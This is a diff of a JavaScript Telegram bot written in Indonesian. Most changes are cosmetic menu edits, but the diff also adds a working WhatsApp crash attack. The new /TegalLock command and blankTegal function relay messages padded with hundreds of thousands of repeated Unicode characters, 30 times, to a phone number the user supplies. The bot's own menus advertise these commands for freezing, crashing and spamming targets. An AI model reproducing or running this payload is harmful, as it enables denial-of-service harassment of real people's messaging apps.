@@ -862,7 +862,7 @@ bot.start(async (ctx) => {
 〣 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @gaxx4u
 〣 ᴠᴇʀsɪᴏɴ : 1.0
 〣 ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ
-〣 ᴛʏᴘᴇ sᴄʀɪᴘᴛ : ʙᴇʙᴀs sᴘᴀᴍ
+〣 ᴛʏᴘᴇ sᴄʀɪᴩᴛ : ʙᴇʙᴀs sᴩᴀᴍ
 <blockquote>⬡═—⊱ INFORMATION ⊰—═⬡</blockquote>
 〣 ᴜsᴇʀɴᴀᴍᴇ : ${username}
 〣 ɪᴅ : ${userId}
@@ -876,12 +876,12 @@ bot.start(async (ctx) => {
   const keyboard = [
     [
       { text: "༺ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆 ༻", callback_data: "xsettings",
-      style : "primary" },
+      style : "danger" },
       { text: "༺ 𝐀𝐓𝐓𝐀𝐂𝐊 ༻", callback_data: "xbugs",
       style : "danger" }
     ],
     [
-      { text: "༺ 𝐓𝐎𝐋𝐎𝐒 ༻", callback_data: "Xdewa",
+      { text: "༺ 𝐓𝐎𝐋𝐎𝐋 ༻", callback_data: "Xdewa",
       style : "primary" }
     ],
     [
@@ -894,11 +894,11 @@ bot.start(async (ctx) => {
       { text: "༺𝐂𝐇𝐀𝐍𝐄𝐋༻", callback_data: "xchanel",
       style : "primary" },
       { text: "༺𝐌𝐀𝐑𝐆𝐀༻", callback_data: "xmarga",
-      style : "danger" }
+      style : "primary" }
     ],
     [
       { text: "🔄 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂 ༻", callback_data: "xupdate",
-      style : "primary" }
+      style : "danger" }
     ]
   ]
 
@@ -963,7 +963,7 @@ Big Respect! 🫡🔥
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "「🔙」メインコース", callback_data: "backstart",
+            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
             style : "danger" }
           ]
         ]
@@ -1008,7 +1008,7 @@ hasil yang udah dicapai.
 Bot ini adalah bukti nyata
 kerja keras dan ketekunannya.
 
-Respect to @gax4u! 🫡🔥
+Respect to @gaxx4u! 🫡🔥
 </pre>
 `;
 
@@ -1026,7 +1026,7 @@ Respect to @gax4u! 🫡🔥
             { text: "💬 CHAT DEVELOPER?", url: "https://t.me/gaxx4u" }
           ],
           [
-            { text: "「🔙」メインコース", callback_data: "backstart",
+            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
             style : "primary" }
           ]
         ]
@@ -1078,7 +1078,7 @@ info penting seputar bot! 🔄
         inline_keyboard: [
           [
             { text: "📢 CHANEL 1", url: "https://t.me/imgax4u",
-            style : "danger" },
+            style : "primary" },
             { text: "📢 CHANEL 2", url: "https://t.me/allstorfank",
             style : "danger" }
           ],
@@ -1087,7 +1087,7 @@ info penting seputar bot! 🔄
             style : "primary" }
           ],
           [
-            { text: "「🔙」メインコース", callback_data: "backstart",
+            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
             style : 'danger' }
           ]
         ]
@@ -1156,7 +1156,7 @@ bot.action("xmarga", async (ctx) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "「🔙」メインコース", callback_data: "backstart",
+            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
             style : "primary" }
           ]
         ]
@@ -1254,7 +1254,7 @@ bot.action("xsettings", async (ctx) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "「🔙」メインコース", callback_data: "backstart",
+            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
             style : 'danger' }
           ]
         ]
@@ -1268,17 +1268,29 @@ bot.action("Xdewa", async (ctx) => {
 
   const caption = `
 <blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>
-〣 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @gaxx4u
-〣 ᴠᴇʀsɪᴏɴ : 1.0
-〣 ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ
-〣 ᴛʏᴘᴇ sᴄʀɪᴘᴛ : ʙᴇʙᴀs sᴘᴀᴍ
 
-<blockquote>⬡═—⊱ TOOLS ⊰—═⬡</blockquote>
-〣 /tiktokdl - Downloader Video Tiktok
-〣 /cekkontol - mengecek kontol kamu
-〣 /cekkhodam - mengecek khodam kamu
-〣 /cekcantik - mengecek cantik kamu
-〣 /iqc - 18:00|40|Indosat|hai hai
+<code>
+╔══════════════════════════════╗
+║         👑 𝐃𝐄𝐕 𝐈𝐍𝐅𝐎           ║
+╠══════════════════════════════╣
+║ ✦ Developer  : @gaxx4u
+║ ✦ Version    : 1.0
+║ ✦ Module     : Telegram
+║ ✦ Type Script: Bebas Spam
+╠══════════════════════════════╣
+║         🛠️ 𝐓𝐎𝐎𝐋𝐒 𝐋𝐈𝐒𝐓          ║
+╠══════════════════════════════╣
+║ ➥ /tiktokdl   - TikTok DL
+║ ➥ /cekkontol  - Cek Kontol
+║ ➥ /cekkhodam  - Cek Khodam
+║ ➥ /cekcantik  - Cek Cantik
+║ ➥ /iqc        - iPhone Quote
+╠══════════════════════════════╣
+║      📌 𝐗𝐎𝐍𝐓𝐎𝐇 𝐏𝐄𝐌𝐀𝐊𝐈𝐀𝐍        ║
+╠══════════════════════════════╣
+║ 💡 /iqc 18:00|40|Indosat|hai
+╚══════════════════════════════╝
+</code>
 `;
 
   await ctx.editMessageMedia(
@@ -1292,8 +1304,7 @@ bot.action("Xdewa", async (ctx) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "「🔙」メインコース", callback_data: "backstart",
-            style : "primary" }
+            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart", style: "primary" }
           ]
         ]
       }
@@ -1301,21 +1312,33 @@ bot.action("Xdewa", async (ctx) => {
   );
 });
 
+// ==================== ATTACK PAGE 1 ==================== //
 bot.action("xbugs", async (ctx) => {
   await ctx.answerCbQuery();
 
   const caption = `
 <blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>
-〣 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @gaxx4u
-〣 ᴠᴇʀsɪᴏɴ : 1.0
-〣 ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ
-〣 ᴛʏᴘᴇ sᴄʀɪᴘᴛ : ʙᴇʙᴀs sᴘᴀᴍ 
 
-<blockquote>⬡═—⊱ ATTACK ⊰—═⬡</blockquote>
-〣 /TegalDelay - Delay invisible
-〣 /
-〣 /
-〣 /
+<pre>
+⚔️  A T T A C K  [ 1 / 2 ]  ⚔️
+
+━━━━━━━━━━━━━━━━━━━━
+
+𑆿 /TegalDelay
+   ├─ Type : Delay Invisible
+   ├─ Jumlah : 35 Message
+   └─ Jeda : 1000ms
+
+𑆿 /TegalLock
+   ├─ Efect : Delay X Freeze
+   ├─ Jumlah : 30 Message
+   └─ Jeda : 1000ms
+
+━━━━━━━━━━━━━━━━━━━━
+
+Geser ke kanan untuk lihat
+menu attack selanjutnya ➡️
+</pre>
 `;
 
   await ctx.editMessageMedia(
@@ -1329,7 +1352,61 @@ bot.action("xbugs", async (ctx) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "「🔙」メインコース", callback_data: "backmenu",
+            { text: "➡️ 𖤐𝐍͜𝐄͢𝐗͡𝐓 𝐏͜𝐀͢𝐆͡𝐄𖤐", callback_data: "xbugs2",
+            style : "primary" }
+          ],
+          [
+            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backmenu",
+            style : 'danger' }
+          ]
+        ]
+      }
+    }
+  );
+});
+
+// ==================== ATTACK PAGE 2 ==================== //
+bot.action("xbugs2", async (ctx) => {
+  await ctx.answerCbQuery();
+
+  const caption = `
+<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>
+
+<pre>
+ 𖤐 𝐊 ͜𝐈 ͢𝐋 ͡𝐋 𝐌͜ 𝐄 ͢𝐍͡ 𝐔 𖤐   [ 2 / 2 ]  
+
+━━━━━━━━━━━━━━━━━━━━
+
+ꦽ /TegalCrash
+   ├─ Type : Crash UI Target
+   └─ Jeda : 1500ms
+
+ꦽ /TegalSpam
+   ├─ Type : Spam Bug Target
+   └─ Jeda : 500ms
+
+━━━━━━━━━━━━━━━━━━━━
+
+Geser ke kiri untuk kembali ⬅️
+</pre>
+`;
+
+  await ctx.editMessageMedia(
+    {
+      type: "photo",
+      media: { source: "./assets/gax4u.jpg" },
+      caption: caption,
+      parse_mode: "HTML"
+    },
+    {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "⬅️ 𖤐𝐏𝐑𝐄𝐕 𝐏𝐀𝐆𝐄𖤐", callback_data: "xbugs",
+            style : "primary" }
+          ],
+          [
+            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backmenu",
             style : 'danger' }
           ]
         ]
@@ -1371,23 +1448,23 @@ bot.action("backmenu", async (ctx) => {
     style : 'danger' }
   ],
   [  
-    { text: "༺ 𝐓𝐎𝐋𝐎𝐒 ༻", callback_data: "Xdewa",
-    style : 'danger' }
+    { text: "༺ 𝐓𝐎𝐋𝐎𝐋 ༻", callback_data: "Xdewa",
+    style : 'primary' }
   ],
   [
     { text: "༺ 𝐓𝐇𝐀𝐍𝐗 𝐓𝐎 ༻", callback_data: "xthanxto",
-    style : "primary" },
+    style : "danger" },
     { text: "༺ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑༻", callback_data: "xdeveloper",
-    style : "primary" }
+    style : "danger" }
   ],
   [
     { text: "༺ 𝐂𝐇𝐀𝐍𝐄𝐋 ༻", callback_data: "xchanel",
     style : "primary" },
     { text: "༺𝐌𝐀𝐑𝐆𝐀༻", callback_data: "xmarga",
-    style : 'danger' }
+    style : 'primary' }
   ],
   [
-    { text: "🔄 𝐔𝐏𝐃𝐀𝐓𝐄 𝐀𝐂 ༻", callback_data: "xupdate",
+    { text: "🔄 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂 ༻", callback_data: "xupdate",
     style : 'danger' }
   ]
 ];
@@ -1435,10 +1512,10 @@ bot.action("backstart", async (ctx) => {
     { text: "༺ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆 ༻", callback_data: "xsettings",
     style : "primary" },
     { text: "༺ 𝐀𝐓𝐓𝐀𝐂𝐊 ༻", callback_data: "xbugs",
-    style : "danger" }
+    style : "primary" }
   ],
   [ 
-    { text: "༺ 𝐓𝐎𝐋𝐎𝐒 ༻", callback_data: "Xdewa",
+    { text: "༺ 𝐓𝐎𝐋𝐎𝐋 ༻", callback_data: "Xdewa",
     style : "danger" }
   ],
   [
@@ -1959,7 +2036,28 @@ Izinkan bot di grup ini?`, {
       delete pendingGroups[chatId];
 
       try {
-        await ctx.telegram.sendMessage(chatId, "😹 Miskin nyulik bot orang tolol buy sc ke : @gaxx4u");
+        await ctx.telegram.sendMessage(chatId, `
+<pre>
+╭━━━〔 🔒 SECURITY DETECT 〕━━━⬣
+┃
+┃ ⚠️ ANTI CULIK PROTECTION
+┃
+┃ ❌ Akses ditolak!
+┃ Pengguna tidak memiliki izin
+┃ untuk menjalankan fitur ini.
+┃
+┃ 🛡️ Sistem keamanan aktif:
+┃ • Anti Culik Group
+┃ • Anti Ambil Alih Admin
+┃ • Anti Penyalahgunaan Bot
+┃ • Auto Security Check
+┃
+┃ Setiap aktivitas mencurigakan
+┃ akan diblokir oleh sistem.
+┃
+╰━━━━━━━━━━━━━━━━━━━━━━⬣
+</pre>
+`, { parse_mode: "HTML" });
         await ctx.telegram.leaveChat(chatId);
       } catch {}
     }
@@ -2252,7 +2350,7 @@ function sleep(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
 
-// ~ Case Bug ~ \\ 1
+// ~ Case Bug 1 ~ \\
 bot.command("TegalDelay", checkChannel, checkCooldown, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply("Contoh : /TegalDelay 628xx");
@@ -2286,7 +2384,66 @@ bot.command("TegalDelay", checkChannel, checkCooldown, checkWhatsAppConnection, 
     console.log(`Succes Sending Bugs To : ${target}`);
   }
 });
+
+// ~ Case Bug 2 ~ \\
+bot.command("TegalLock", checkChannel, checkCooldown, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply("Contoh : /TegalLock 628xx");
+
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await detectPV(ctx, "/TegalLock", q);
+
+  
+  if (ctx.chat.type === "private") {
+    return ctx.reply("❌ ☇ Fitur ini tidak bisa digunakan di private chat");
+  }
+
+  await ctx.reply(
+`⸙ 
+♛ Target : ${q}
+♛ Type : Result 
+♛ Status : Dikirim`,
+  {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "Cek Target", url: `https://wa.me/${q}` }],
+      ],
+    },
+  });
+
+  for (let i = 0; i < 30; i++) {
+    await blankTegal(sock, target);
+    await sleep(1000);
+    console.log(`Succes Sending Bugs To : ${target}`);
+  }
+});
+
 // ~ Function Bugs ~ \ \
+async function blankTegal(sock, target) {
+    const msg = {
+        viewOnceMessage: {
+            message: {
+                newsletterAdminInviteMessage: {
+                    newsletterJid: "083149016304@newsletter",
+                    inviteCode: "𑜦𑜠".repeat(120000),
+                    inviteExpiration: 99999999999,
+                    newsletterName: "ោ៝" + "ꦾ".repeat(250000),
+                    body: {
+                        text: "TegalCty" + "ી".repeat(250000)
+                    }
+                }
+            }
+        }
+    };
+
+    await sock.relayMessage(target, msg, {
+        participant: { jid: target },
+        messageId: sock.generateMessageTag()
+    });
+}
+
 async function TegalCtyDelay(sock, target) {
     try {
         const rezz = {
